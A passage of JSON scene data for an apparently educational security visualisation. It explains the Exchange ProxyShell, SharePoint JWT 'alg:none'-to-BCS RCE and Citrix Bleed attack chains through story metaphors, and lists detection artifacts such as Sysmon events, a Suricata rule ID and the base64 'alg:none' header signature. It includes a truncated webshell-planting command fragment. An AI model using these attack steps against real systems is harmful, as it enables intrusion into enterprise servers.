        },
        {
          "id": 2,
          "shortLabel": "2. Uses Wall",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Mailbox export command",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses mailbox export command to advance toward public noticeboard wall.",
          "technicalParallel": "With the \"Mailbox Import Export\" role assigned, the attacker saves a draft email containing an encoded JScript/C# ASPX webshell, and then executes New-MailboxExportRequest -Mailbox admin@corp.local…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Wall",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Web-script label",
          "storyExcerpt": "Behind the scenes, web-script label captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CISA AA21-265A: MSExchange Management EventID 1 (New-MailboxExportRequest with .aspx) and Sysmon EventID 11 (MSExchangeMailboxReplication.exe creating .aspx in aspnet_client).",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Lobby Desk",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Mailroom Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Backend Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "memory-forensics": {
      "scenarioId": "proxyshell-exchange-cve-2021-34473",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-proxyshell-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Microsoft Exchange \"ProxyShell\": Autodiscover SSRF to MailboxExport… — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of lobby desk beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: w3wp.exe (Backend PowerShell :444) (MSExchangePowerShellAppPool (X-Rps-CAT Admin Context) [RW-])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of w3wp.exe (Backend PowerShell :444)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007FF884120000 (RW-, 96 KB) · MSExchangePowerShellAppPool (X-Rps-CAT Admin Context)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against w3wp.exe (Backend PowerShell :444) (PID 6290)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Forged Windows CommonAccessToken reconstructed from X-Rps-CAT query string with Administrator SID.",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-proxyshell-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of w3wp.exe…",
          "tone": "sky"
        },
        {
          "id": "net-proxyshell-memory-xray-right",
          "tag": "LIVE MEMORY · RW-",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007FF884120000 (RW-, 96 KB) · MSExchangePowerShellAppPool…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline w3wp.exe (Backend PowerShell :444) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007FF884120000 (RW-, 96 KB) containing MSExchangePowerShellAppPool (X-Rps-CAT Admin Context).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 6290 confirms injected region: Forged Windows CommonAccessToken reconstructed from X-Rps-CAT query string with Administrator SID.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "sharepoint-cve-2023-29357-24955-chain": {
    "briefing": {
      "scenarioId": "sharepoint-cve-2023-29357-24955-chain",
      "sectionKey": "briefing",
      "sceneKind": "net-sharepoint-chain-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Microsoft SharePoint: JWT \"alg:none\" Auth Bypass to BCS RCE Chain — Story-to-Technical Overview",
      "storyCue": "A document archive verifies visitor passes using a wax seal stamp, but a misread rule accepts any pass marked \"no seal required\". An outsider presents a blank-seal pass to copy the head archivist ID, prints a second blank-seal pass under that director name, and loads an unsigned plug-in cartridge that runs commands inside the archive engine.",
      "technicalCue": "INITIAL ACCESS: FORGING AN UNSIGNED OAUTH JWT WITH \"ALG: NONE\" (CVE-2023-29357) -> CREDENTIAL ACCESS: IMPERSONATING THE SHAREPOINT FARM ADMINISTRATOR -> EXECUTION: BUSINESS CONNECTIVITY SERVICES (.BDCM) ASSEMBLY RCE (CVE-2023-24955)",
      "storyMappings": [
        {
          "storyTerm": "Document archive portal",
          "technicalTerm": "On-premises Microsoft SharePoint Server",
          "tone": "amber"
        },
        {
          "storyTerm": "Blank-seal visitor pass",
          "technicalTerm": "Unsigned \"alg\": \"none\" OAuth JWT token (CVE-2023-29357)",
          "tone": "sky"
        },
        {
          "storyTerm": "Head archivist ID",
          "technicalTerm": "Site administrator nameid claim from siteusers API",
          "tone": "rose"
        },
        {
          "storyTerm": "Unsigned plug-in cartridge",
          "technicalTerm": "Malicious BCS .bdcm DotNetAssembly model (CVE-2023-24955)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-sharepoint-chain-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Document archive portal",
          "subtitle": "On-premises Microsoft SharePoint Server",
          "tone": "amber"
        },
        {
          "id": "net-sharepoint-chain-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Blank-seal visitor pass",
          "subtitle": "Unsigned \"alg\": \"none\" OAuth JWT token (CVE-2023-29357)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "FORGING AN UNSIGNED OAUTH JWT WITH \"ALG: NONE\" (CVE-2023-29357)",
          "storyExcerpt": "An outsider writes a homemade pass labeled \"no signature needed\" and hands it to the archive directory window. The clerk skips the seal check and hands back the full roster of head archivists and their…",
          "technicalParallel": "Why is the Base64 string \"eyJhbGciOiJub25l\" such a reliable network detection signature?",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Pass",
          "stageTag": "STAGE 02 · CREDENTIAL ACCESS",
          "title": "IMPERSONATING THE SHAREPOINT FARM ADMINISTRATOR",
          "storyExcerpt": "Copying the chief director badge number onto a second blank-seal pass marked \"internal desk call\", the outsider steps past every outer gate and enters the archive control room with full farm-wide…",
          "technicalParallel": "Because CVE-2023-29357 only grants SharePoint application-level administrator privileges rather than direct OS command execution, the attacker needs a post-authentication SharePoint RCE primitive (Step…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Head Id",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "BUSINESS CONNECTIVITY SERVICES (.BDCM) ASSEMBLY RCE (CVE-2023-24955)",
          "storyExcerpt": "Using chief director authority, the outsider uploads a custom business connector blueprint packed with hidden assembly code. The archive server compiles and executes that blueprint directly inside its…",
          "technicalParallel": "Because the malicious .NET assembly is stored inside the SharePoint SQL database and loaded directly into w3wp.exe memory via Assembly.Load(byte[]), no .aspx webshell file needs to be written to the IIS…",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Seal Press",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Archive Portal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forged Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "sharepoint-cve-2023-29357-24955-chain",
      "sectionKey": "step-1",
      "sceneKind": "net-sharepoint-chain-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Sending an Unsigned \"alg\": \"none\" OAuth JWT to /_api/web/siteusers (CVE-2023-29357)",
      "storyCue": "An outsider writes a homemade pass labeled \"no signature needed\" and hands it to the archive directory window. The clerk skips the seal check and hands back the full roster of head archivists and their badge numbers.",
      "technicalCue": "T1190 · INITIAL ACCESS — As detailed by STAR Labs and Rapid7, the attacker first sends an unauthenticated request with Authorization: Bearer to SharePoint to read the server’s Realm UUID from the HTTP 401…",
      "storyMappings": [
        {
          "storyTerm": "Homemade unsigned pass",
          "technicalTerm": "Bearer JWT with header {\"alg\":\"none\"}",
          "tone": "amber"
        },
        {
          "storyTerm": "Archive directory window",
          "technicalTerm": "/_api/web/siteusers REST endpoint",
          "tone": "sky"
        },
        {
          "storyTerm": "Skipped wax-seal check",
          "technicalTerm": "Broken signature validation in CVE-2023-29357",
          "tone": "rose"
        },
        {
          "storyTerm": "Head archivist roster",
          "technicalTerm": "Enumerated administrator NameId and login accounts",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-sharepoint-chain-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Homemade unsigned pass",
          "subtitle": "Bearer JWT with header {\"alg\":\"none\"}",
          "tone": "amber"
        },
        {
          "id": "net-sharepoint-chain-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Archive directory window",
          "subtitle": "/_api/web/siteusers REST endpoint",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STEP 01 · SETUP",
          "title": "Homemade unsigned pass",
          "storyExcerpt": "An outsider writes a homemade pass labeled \"no signature needed\" and hands it to the archive directory window.",
          "technicalParallel": "Why is the Base64 string \"eyJhbGciOiJub25l\" such a reliable network detection signature?",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Seal Back",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Archive directory window",
          "storyExcerpt": "The clerk skips the seal check and hands back the full roster of head archivists and their badge numbers.",
          "technicalParallel": "As detailed by STAR Labs and Rapid7, the attacker first sends an unauthenticated request with Authorization: Bearer to SharePoint to read the server’s Realm UUID from the HTTP 401 WWW-Authenticate…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Wax-seal",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Head archivist roster",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across head archivist roster while locking down skipped wax-seal check.",
          "technicalParallel": "Documented by STAR Labs, Rapid7, and Suricata SID 2048312 (network detection rules for SharePoint JWT spoofing): Authorization: Bearer eyJhbGciOiJub25l header targeting /_api/web/siteusers (exposing an…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Seal Press",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Archive Portal",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forged Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "sharepoint-cve-2023-29357-24955-chain",
      "sectionKey": "step-2",
      "sceneKind": "net-sharepoint-chain-step-2",
      "stageBadge": "STEP #2 · CREDENTIAL ACCESS",
      "title": "Minting a Second \"alg\": \"none\" JWT with the Farm Administrator’s nameid (SID)",
      "storyCue": "Copying the chief director badge number onto a second blank-seal pass marked \"internal desk call\", the outsider steps past every outer gate and enters the archive control room with full farm-wide authority.",
      "technicalCue": "T1550.001 · CREDENTIAL ACCESS — From the /_api/web/siteusers response, the attacker extracts a Site Collection or Farm Administrator’s UserId.NameId (their Windows Active Directory SID, e.g., s-1-5-21-...-500) and…",
      "storyMappings": [
        {
          "storyTerm": "Second blank-seal pass",
          "technicalTerm": "Spoofed administrator JWT containing stolen nameid",
          "tone": "amber"
        },
        {
          "storyTerm": "Internal desk call stamp",
          "technicalTerm": "Forged isloopback=true claim in token payload",
          "tone": "sky"
        },
        {
          "storyTerm": "Archive control room",
          "technicalTerm": "SharePoint Farm Administrator management plane",
          "tone": "rose"
        },
        {
          "storyTerm": "Security desk trace book",
          "technicalTerm": "SharePoint ULS token validation log",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-sharepoint-chain-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Second blank-seal pass",
          "subtitle": "Spoofed administrator JWT containing stolen nameid",
          "tone": "amber"
        },
        {
          "id": "net-sharepoint-chain-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Internal desk call stamp",
          "subtitle": "Forged isloopback=true claim in token payload",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STEP 02 · SETUP",
          "title": "Second blank-seal pass",
          "storyExcerpt": "Copying the chief director badge number onto a second blank-seal pass marked \"internal desk call\", the outsider steps past every outer gate and enters the archive control room with full…",
          "technicalParallel": "Because CVE-2023-29357 only grants SharePoint application-level administrator privileges rather than direct OS command execution, the attacker needs a post-authentication SharePoint RCE primitive (Step…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Desk Call",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Internal desk call stamp",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses internal desk call stamp to advance toward archive control room.",
          "technicalParallel": "From the /_api/web/siteusers response, the attacker extracts a Site Collection or Farm Administrator’s UserId.NameId (their Windows Active Directory SID, e.g., s-1-5-21-...-500) and UserId.NameIdIssuer…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Room",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Security desk trace book",
          "storyExcerpt": "Behind the scenes, security desk trace book captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in SharePoint ULS Logs (application-layer authentication audit traces): SPJsonWebSecurityTokenHandler validating an isloopback=true token for an administrator nameid from an external IP (a…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Seal Press",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Archive Portal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forged Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1550.001"
    },
    "step-3": {
      "scenarioId": "sharepoint-cve-2023-29357-24955-chain",
      "sectionKey": "step-3",
      "sceneKind": "net-sharepoint-chain-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "Importing a Malicious BCS .bdcm DotNetAssembly Model for In-Memory RCE (CVE-2023-24955)",
      "storyCue": "Using chief director authority, the outsider uploads a custom business connector blueprint packed with hidden assembly code. The archive server compiles and executes that blueprint directly inside its live workspace.",
      "technicalCue": "T1505.003 · EXECUTION — Using the forged Farm Administrator JWT, the attacker chains CVE-2023-24955 by uploading a crafted Business Data Connectivity Model (.bdcm) XML file to SharePoint’s Business Connectivity…",
      "storyMappings": [
        {
          "storyTerm": "Business connector blueprint",
          "technicalTerm": "Imported BCS .bdcm application model file",
          "tone": "amber"
        },
        {
          "storyTerm": "Hidden assembly code",
          "technicalTerm": "Embedded DotNetAssembly compiled in memory",
          "tone": "sky"
        },
        {
          "storyTerm": "Archive server workspace",
          "technicalTerm": "SharePoint w3wp.exe application pool process",
          "tone": "rose"
        },
        {
          "storyTerm": "Direct machine execution",
          "technicalTerm": "Authenticated remote code execution (CVE-2023-24955)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-sharepoint-chain-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Business connector blueprint",
          "subtitle": "Imported BCS .bdcm application model file",
          "tone": "amber"
        },
        {
          "id": "net-sharepoint-chain-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Hidden assembly code",
          "subtitle": "Embedded DotNetAssembly compiled in memory",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Code",
          "stageTag": "STEP 03 · SETUP",
          "title": "Business connector blueprint",
          "storyExcerpt": "Using chief director authority, the outsider uploads a custom business connector blueprint packed with hidden assembly code.",
          "technicalParallel": "Because the malicious .NET assembly is stored inside the SharePoint SQL database and loaded directly into w3wp.exe memory via Assembly.Load(byte[]), no .aspx webshell file needs to be written to the IIS…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Code",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Hidden assembly code",
          "storyExcerpt": "The archive server compiles and executes that blueprint directly inside its live workspace.",
          "technicalParallel": "Using the forged Farm Administrator JWT, the attacker chains CVE-2023-24955 by uploading a crafted Business Data Connectivity Model (.bdcm) XML file to SharePoint’s Business Connectivity Services (BCS)…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Direct machine execution",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across direct machine execution while locking down archive server workspace.",
          "technicalParallel": "Documented by STAR Labs & Microsoft MSRC: Sysmon EventID 1 (w3wp.exe spawning cmd.exe / powershell.exe) following /_api/web/siteusers access.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Seal Press",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Archive Portal",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Forged Pass",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1505.003"
    },
    "memory-forensics": {
      "scenarioId": "sharepoint-cve-2023-29357-24955-chain",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-sharepoint-chain-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Microsoft SharePoint: JWT \"alg:none\" Auth Bypass to BCS RCE Chain — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of seal press beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: w3wp.exe (BCS DotNetAssembly) (SharePoint OAuth2 JWT + BCS In-Memory Assembly [R-X])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of w3wp.exe (BCS DotNetAssembly)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007FF871900000 (R-X, 64 KB) · SharePoint OAuth2 JWT + BCS In-Memory Assembly",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against w3wp.exe (BCS DotNetAssembly) (PID 4844)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Unsigned JWT (alg:none) granting Farm Admin claims followed by in-memory Assembly.Load() from the imported .bdcm…",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-sharepoint-chain-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of w3wp.exe (BCS…",
          "tone": "sky"
        },
        {
          "id": "net-sharepoint-chain-memory-xray-right",
          "tag": "LIVE MEMORY · R-X",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007FF871900000 (R-X, 64 KB) · SharePoint OAuth2 JWT + BCS…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline w3wp.exe (BCS DotNetAssembly) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007FF871900000 (R-X, 64 KB) containing SharePoint OAuth2 JWT + BCS In-Memory Assembly.",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 4844 confirms injected region: Unsigned JWT (alg:none) granting Farm Admin claims followed by in-memory Assembly.Load() from the imported .bdcm package.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "splunk-citrix-bleed-session-hijack": {
    "briefing": {
      "scenarioId": "splunk-citrix-bleed-session-hijack",
      "sectionKey": "briefing",
      "sceneKind": "net-citrix-bleed-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Citrix Bleed: NetScaler OOB Memory Leak & NSC_AAAC Hijack — Story-to-Technical Overview",
      "storyCue": "A coatroom clerk copies your claim label onto a fixed-size receipt slip, but when a guest hands in an overly long name card, the clerk accidentally prints neighboring coat tickets from the counter drawer onto the back. An outsider grabs a printed executive coat ticket, skips the front check-in desk, and strolls straight into the private corporate office floor.",
      "technicalCue": "INITIAL ACCESS: NETSCALER SNPRINTF OOB MEMORY LEAK (CVE-2023-4966) -> CREDENTIAL ACCESS: NSC_AAAC SESSION COOKIE EXTRACTION & MFA BYPASS -> LATERAL & C2: CITRIX ICA VDI LAUNCH & INTERNAL AD RECONNAISSANCE",
      "storyMappings": [
        {
          "storyTerm": "Overly long name card",
          "technicalTerm": "Oversized HTTP Host request header (CVE-2023-4966)",
          "tone": "amber"
        },
        {
          "storyTerm": "Neighboring counter tickets",
          "technicalTerm": "Leaked adjacent NetScaler process memory",
          "tone": "sky"
        },
        {
          "storyTerm": "Executive coat ticket",
          "technicalTerm": "65-character NSC_AAAC authenticated session cookie",
          "tone": "rose"
        },
        {
          "storyTerm": "Private office floor",
          "technicalTerm": "Internal virtual desktop and remote server tier",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-citrix-bleed-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Overly long name card",
          "subtitle": "Oversized HTTP Host request header (CVE-2023-4966)",
          "tone": "amber"
        },
        {
          "id": "net-citrix-bleed-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Neighboring counter tickets",
          "subtitle": "Leaked adjacent NetScaler process memory",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Long Name",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "NETSCALER SNPRINTF OOB MEMORY LEAK (CVE-2023-4966)",
          "storyExcerpt": "An outsider approaches the public information counter with an unusually long address label. While preparing the printed directory reply, the counter machine overruns its tray and dumps handfuls of…",
          "technicalParallel": "In the C standard library, snprintf(buf, size, fmt...) stops writing at size bytes to prevent a crash, but returns the theoretical total length of the formatted string.",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Coat Vip",
          "stageTag": "STAGE 02 · CREDENTIAL ACCESS",
          "title": "NSC_AAAC SESSION COOKIE EXTRACTION & MFA BYPASS",
          "storyExcerpt": "Sifting through the spilled counter scraps, the outsider spots an active sixty-five-symbol coat claim ticket belonging to a signed-in manager. Presenting that copied ticket at the VIP entrance opens the…",
          "technicalParallel": "Because the NSC_AAAC cookie represents an active server-side AAA session in NetScaler memory, even patching the appliance or resetting the victim’s Active Directory password does not kick the attacker…",
